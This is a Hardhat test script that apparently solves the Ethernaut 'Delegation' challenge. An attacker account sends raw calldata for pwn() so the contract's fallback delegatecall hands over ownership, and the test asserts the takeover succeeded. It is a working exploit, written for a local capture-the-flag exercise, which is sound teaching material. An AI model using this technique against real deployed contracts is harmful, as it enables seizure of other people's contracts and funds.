import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('Delegation', () => {
  let delegate: Contract;
  let delegation: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  before(async () => {
    const [DelegateFactory, DelegationFactory] = await Promise.all([
      ethers.getContractFactory('Delegate'),
      ethers.getContractFactory('Delegation'),
    ]);

    [owner, attacker] = await ethers.getSigners();

    delegate = await DelegateFactory.deploy(owner.address);
    await delegate.deployed();

    delegation = await DelegationFactory.deploy(delegate.address);
    await delegation.deployed();
  });

  it('attack', async () => {
    const iface = new ethers.utils.Interface(['function pwn()']);
    const data = iface.encodeFunctionData('pwn');

    const tx = await attacker.sendTransaction({
      to: delegation.address,
      data,
      gasLimit: 32000,
    });

    await tx.wait();

    expect(await delegation.owner()).to.equal(attacker.address);
  });
});
